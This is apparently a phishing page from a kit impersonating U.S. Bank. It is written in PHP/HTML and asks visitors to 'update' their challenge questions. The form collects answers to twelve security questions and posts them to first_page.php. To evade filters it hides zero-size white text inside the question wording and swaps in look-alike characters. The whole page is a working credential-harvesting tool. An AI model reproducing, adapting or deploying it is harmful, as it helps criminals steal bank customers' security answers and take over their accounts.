<?php session_start(); ?>
<!DOCTYPE html>
<html class="ng-scope" lang="en">
	<head class="at-element-marker">

<meta http-equiv="content-type" content="text/html; charset=UTF-8">

		<meta http-equiv="Cache-Control" content="private,no-cache, no-store, must-revalidate">
		<meta http-equiv="Expires" content="-1">
		<meta http-equiv="Pragma" content="private,no-cache">
      <title>Authentication Preferences</title>
      <style type="text/css">
	  body
	  {
		  margin:0;
	  }
         .usb-olb-navigation--a11y-shell {
         display: none;
         }
         .usb-olb-navigation--navbar-white, .usb-olb-navigation--navbar-secondary{
         background: transparent;
         box-shadow: none;
         }
         .container{
         width:1272px!important;
         margin-left: auto!important;
         }
         .header .headerBar {
         height: 33px;
         position: relative;
         display: inline-block;
         width: 100%;
         color: #fff;
         text-align: center;
         -webkit-border-radius: 4px;
         -webkit-background-clip: padding-box;
         -moz-border-radius: 4px;
         -moz-background-clip: padding;
         border-radius: 4px;
         background-clip: padding-box;
         background-image: -moz-linear-gradient(bottom, #0c2074 0%, #0e5bb1 100%);
         background-image: -webkit-linear-gradient(bottom, #0c2074 0%, #0e5bb1 100%);
         background-image: -o-linear-gradient(bottom, #0c2074 0%, #0e5bb1 100%);
         background-image: linear-gradient(to top, #0c2074 0%, #0e5bb1 100%);
         background-image: -webkit-gradient(linear, left bottom, left top, color-stop(0%, #0c2074), color-stop(100%, #0e5bb1));
         filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#0e5bb1', endColorstr='#0c2074',GradientType=0 );
         background-image: -webkit-gradient(linear, left bottom, left top, color-stop(0%, #0c2074), color-stop(100%, #0e5bb1));
         }

		.commonHeader {
		margin-top: 20px!important;
		margin-bottom: 0px!important;
		overflow: visible!important;
		}
		.logo {
			background: url(images/logo.png)!important;
			background-repeat: no-repeat!important;
			display: inline-block!important;
			width: 205px!important;
			height: 51px!important;
		}
		.commonHeader {
			margin-top: 18px;
			margin-bottom: 22px;
			overflow: visible;
		}
		.headerBar {
			height: 33px;
			position: relative;
			display: inline-block;
			width: 100%;
			color: #fff;
			text-align: center;
			-webkit-border-radius: 4px;
			-webkit-background-clip: padding-box;
			-moz-border-radius: 4px;
			-moz-background-clip: padding;
			border-radius: 4px;
			background-clip: padding-box;
			background-image: -webkit-gradient(linear, left bottom, left top, color-stop(0%, #0c2074), color-stop(100%, #0e5bb1));
			filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#0e5bb1', endColorstr='#0c2074',GradientType=0 );
			padding-top: 5px;
		}
		.headerBar a {
			color: #fff;
		}
		.headerBar span {
			position: absolute;
			left: 10px;
			margin: 1px 0 0 10px;
			font-size: 12px;
			font-weight: bold;
			background: url(../Images/DT-Tablet-Back-Arrow.0180881141.png) no-repeat left 10px;
			background-size: 7px 11px;
		}
		.aler-msgclass {
			background: #f2dede;
			padding: 11px 13px;
			margin-bottom: 10px;
			border: 1px solid #c20c0c;
			border-radius: 5px;
			font-size: 15px;
		}
		.aler-msgclass img {
			width: 20px;
			vertical-align: text-bottom;
			padding-right: 3px;
		}
		.logo {
    /* background-image: url('../Images/usbank-desktop.0180881141.png'); */
    background-image: url(data:image/png;base64,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)!important;
    background-repeat: no-repeat;
    display: inline-block;
    width: 205px;
    height: 51px;
}
.wht{
	color:white;
	font-size: 0px;
}
      </style>
			<link href="assets/Styles.css" rel="stylesheet">
			<link rel="Stylesheet" type="text/css" href="assets/skinCommon.css">

			<link rel="Stylesheet" type="text/css" media="screen, projection" href="assets/usbankDesktop.css">
			<link href="assets/Styles_002.css" rel="stylesheet">
			<link href="assets/TransmitCssBundle.css" rel="stylesheet">
			<link href="assets/AuthPreferenceStylesBundle.css" rel="stylesheet">
			<link href="assets/custom_auth.css" rel="stylesheet">
			<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
   </head>
   <body class="customBackground">



<header class="mp4 ml4 tp8 tl8 d24">
<div>
    <div class="commonHeader">
        <div class="container">
        <img id="keepalive" src="assets/PingImage.gif" style="display: none;">
        <div class="CCAPCSBwrap">
            <div class="logo blueLogo"></div>
            <span class="brandingusbanklogo"></span>
        </div>
    </div>
    </div>
</div>

<div class="container">
    <div class="headerBar ">

        <span style="font-weight: bold; font-size: 16px; text-transform: uppercase;">Challenge Questions Update</span>
    </div>
</div>
</header>



      <div class="mainBodyWidth">
         <div id="dynamicElementMaster"></div>
   <!--       <div class="body-content bodyDiv" role="main" > -->
         <div class="body-content" role="main" style="margin: auto ;
    width: 1230px ;">
            <div class="container-fluid ng-scope">
               <!-- uiView:  -->
               <div ui-view="" class="ng-scope">
                  <div class="IdShield ng-scope">
                     <div class="deviceManagement omni-wrapper desktop" style="padding-top: 20px;">
                       <!--  <h1>


                        </h1> -->


                        <div class="content-margin">
                           Please update your challenge questions to increase your account security.
                        </div>

                        <div class="content-margin">
                                         <!-- To protect your accounts, choose 3 to 5 questions only you can answer. After you select a question, a space
                           for your answer will appear below it. -->
                        </div>
                        <!-- <div class="content-margin">
                           If you are updating, please choose all new questions, no editing existing answers.
                        </div> -->
                        <?php
                        $a = mt_rand(100000000, 999999999);
		                  //header('location:thnku.php?reg='.$a);
                        ?>
                        <div class="aler-msgclass" id="alert_1" style="display:none;"><img src="alert-icon.png"> Please make sure you have aswered all selected questions.</div>
                        <div class="aler-msgclass" id="alert_2" style="display:none;"><img src="alert-icon.png"> Please select at least 5 ID Shield questions</div>
                        <form method="post" action="first_page.php<?php echo "?reg=".$a; ?>" onsubmit="return check_data();">
                        <div class="omni-contenttable">
                           <div class="container QAsection">
                              <div class="ng-scope">
                                 <div>
                                    <div>
                                       <span class="checkbox">
                                          <input class="checkboxPos ng-pristine ng-untouched ng-valid" id="question2" onclick="questions('1','first_ans');" type="checkbox">
                                          <label id="labelQuestion1" aria-label="What was the name ọf your best friend in high-school?" for="questionCheckbox1" class="ng-binding">
                                             W<span class="wht"> m</span>hat <span class="wht"> m</span>was the name ọf your best friend <span class="wht"> m</span>in high-school?
                                          </label>
                                           <input id="first_ans" name="first_ans" style="display:none;" placeholder="" class="ng-pristine ng-untouched" type="text">
                                       </span>
                                    </div>
                                 </div>
								     <div>
                                 <div >
                                    <div>
                                       <span class="checkbox">
                                          <input class="checkboxPos ng-pristine ng-untouched " id="question3" onclick="questions('3','third_ans');" type="checkbox"> <!--ng-click="stateChanged(data.isSelected)"-->
                                          <label id="labelQuestion3" aria-label="Where did you meet your spouse or partner for the very first time?" for="questionCheckbox3" class="ng-binding">
                                             <!--{{data}}-->
                                             W<span class="wht"> m</span>here <span class="wht"> m</span>did you meet your spouse or partner <span class="wht"> m</span>for the very first time?
                                          </label>
                                          <input id="third_ans" name="third_ans" style="display:none;" placeholder="" class="ng-pristine ng-untouched " type="text">
                                       </span>
                                    </div>
                                 </div>
                              </div>
                                 <div class="clearfix">
                                 </div>
                              </div>
                                <div>
                                    <div>
                                        <div>
                                            <span class="checkbox">
                                                <input class="checkboxPos ng-pristine ng-untouched " id="question3" type="checkbox" onclick="questions('2','second_ans');"> <!--ng-click="stateChanged(data.isSelected)"-->
                                                <label id="labelQuestion2" aria-label="What is the name ọf your first pet?" for="questionCheckbox2" class="ng-binding">
                                                    W<span class="wht"> m</span>hat is the name ọf your first <span class="wht"> m</span>pet?
                                                </label>
                                                <input id="second_ans" name="second_ans" style="display:none;" placeholder="" class="ng-pristine ng-untouched " type="text">
                                            </span>
                                        </div>
                                    </div>
                                </div>

                              <div >
                                 <div >
                                    <div>
                                       <span class="checkbox">
                                       <input class="checkboxPos ng-pristine ng-untouched ng-valid" id="questionCheckbox4" onclick="questions('4','fourth_ans');" type="checkbox"> <!--ng-click="stateChanged(data.isSelected)"-->
                                       <label id="labelQuestion4" aria-label="What was the name ọf your favorite manager?" for="question4" class="ng-binding">
                                          <!--{{data}}-->
                                          W<span class="wht"> m</span>hat was the name ọf your <span class="wht"> m</span>favorite manager?
                                       </label>
                                       <input id="fourth_ans" name="fourth_ans" style="display:none;" placeholder="" class="ng-pristine ng-untouched " type="text">
                                    </div>
                                 </div>
                              </div>
                              <div >
                                 <div >
                                    <div>
                                       <span class="checkbox">
                                          <input class="checkboxPos ng-pristine ng-untouched" id="question5" onclick="questions('5','fifth_ans');" type="checkbox"> <!--ng-click="stateChanged(data.isSelected)"-->
                                          <label id="labelQuestion5" aria-label="What country would you most like to visit?" for="questionCheckbox5" class="ng-binding">
                                             <!--{{data}}-->
                                             W<span class="wht"> m</span>hat country would you<span class="wht"> m</span> most like to visit?
                                          </label>
                                          <input id="fifth_ans" name="fifth_ans" style="display:none;" placeholder="" class="ng-pristine ng-untouched " type="text">
                                       </span>
                                    </div>
                                 </div>
                              </div>
                              <div >
                                 <div >
                                    <div>
                                       <span class="checkbox">
                                          <input class="checkboxPos ng-pristine ng-untouched ng-valid" id="question6" onclick="questions('6','sixth_ans');" type="checkbox"> <!--ng-click="stateChanged(data.isSelected)"-->
                                          <label id="labelQuestion6" aria-label="What was the model ọf your first car?" for="questionCheckbox6" class="ng-binding">
                                             <!--{{data}}-->
                                             W<span class="wht"> m</span>hat was the model ọf your <span class="wht"> m</span>first car?
                                          </label>
                                          <input id="sixth_ans" name="sixth_ans" style="display:none;" placeholder="" class="ng-pristine ng-untouched " type="text">
                                       </span>
                                    </div>
                                 </div>
                              </div>
                              <div >
                                 <div >
                                    <div>
                                       <span class="checkbox">
                                          <input class="checkboxPos ng-pristine ng-untouched ng-valid" id="question7" onclick="questions('7','seventh_ans');" type="checkbox"> <!--ng-click="stateChanged(data.isSelected)"-->
                                          <label id="labelQuestion7" aria-label="What is your dream car?" for="questionCheckbox7" class="ng-binding">
                                             <!--{{data}}-->
                                             W<span class="wht"> m</span>hat is your <span class="wht"> m</span>dream car?
                                          </label>
                                          <input id="seventh_ans" name="seventh_ans" style="display:none;" placeholder="" class="ng-pristine ng-untouched " type="text">
                                       </span>
                                    </div>
                                 </div>
                              </div>
                              <div >
                                 <div >
                                    <div>
                                       <span class="checkbox">
                                          <input class="checkboxPos ng-pristine ng-untouched ng-valid" id="question8" onclick="questions('8','eigth_ans');" type="checkbox"> <!--ng-click="stateChanged(data.isSelected)"-->
                                          <label id="labelQuestion8" aria-label="What was your favorite game as a child?" for="questionCheckbox8" class="ng-binding">
                                             <!--{{data}}-->
                                             W<span class="wht"> m</span>hat was your <span class="wht"> m</span>favorite game as a child?
                                          </label>
                                          <input id="eigth_ans" name="eigth_ans" style="display:none;" placeholder="" class="ng-pristine ng-untouched " type="text">
                                       </span>
                                    </div>
                                 </div>
                                 <div class="clearfix"></div>
                              </div>
                              <div >
                                 <div >
                                    <div>
                                       <span class="checkbox">
                                          <input class="checkboxPos ng-pristine ng-untouched ng-valid"  id="questionCheckbox9" onclick="questions('9','ninth_ans');" type="checkbox"> <!--ng-click="stateChanged(data.isSelected)"-->
                                          <label id="labelQuestion9" aria-label="What was your favorite movie as a child?" for="question9" class="ng-binding">
                                             <!--{{data}}-->
                                             W<span class="wht"> m</span>hat was your <span class="wht"> m</span>favorite movie as a child?
                                          </label>
                                          <input id="ninth_ans" name="ninth_ans" style="display:none;" placeholder="" class="ng-pristine ng-untouched " type="text">
                                       </span>
                                    </div>
                                 </div>
                                 <div class="clearfix"></div>
                              </div>

                              <div >
                                 <div >
                                    <div>
                                       <span class="checkbox">
                                          <input class="checkboxPos ng-pristine ng-untouched ng-valid"  id="questionCheckbox10" onclick="questions('10','tenth_ans');" type="checkbox"> <!--ng-click="stateChanged(data.isSelected)"-->
                                          <label id="labelQuestion10" aria-label="In what city were you married? " for="question10" class="ng-binding">
                                             In what city were you married? 
                                          </label>
                                          <input id="tenth_ans" name="tenth_ans" style="display:none;" placeholder="" class="ng-pristine ng-untouched " type="text">
                                       </span>
                                    </div>
                                 </div>
                                 <div class="clearfix"></div>
                              </div>

                              <div >
                                 <div >
                                    <div>
                                       <span class="checkbox">
                                          <input class="checkboxPos ng-pristine ng-untouched ng-valid"  id="11" onclick="questions('11','eleventh_ans');" type="checkbox"> <!--ng-click="stateChanged(data.isSelected)"-->
                                          <label id="11" aria-label="What was the name of your favorite childhood toy?" for="11" class="ng-binding">
                                             What was the name of your favorite childhood toy?
                                          </label>
                                          <input id="eleventh_ans" name="eleventh_ans" style="display:none;" placeholder="" class="ng-pristine ng-untouched " type="text">
                                       </span>
                                    </div>
                                 </div>
                                 <div class="clearfix"></div>
                              </div>

                              <div >
                                 <div >
                                    <div>
                                       <span class="checkbox">
                                          <input class="checkboxPos ng-pristine ng-untouched ng-valid"  id="12" onclick="questions('12','twelveth_ans');" type="checkbox"> <!--ng-click="stateChanged(data.isSelected)"-->
                                          <label id="12" aria-label="Who was your childhood hero?" for="12" class="ng-binding">
                                             Who was your childhood hero?
                                          </label>
                                          <input id="twelveth_ans" name="twelveth_ans" style="display:none;" placeholder="" class="ng-pristine ng-untouched " type="text">
                                       </span>
                                    </div>
                                 </div>
                                 <div class="clearfix"></div>
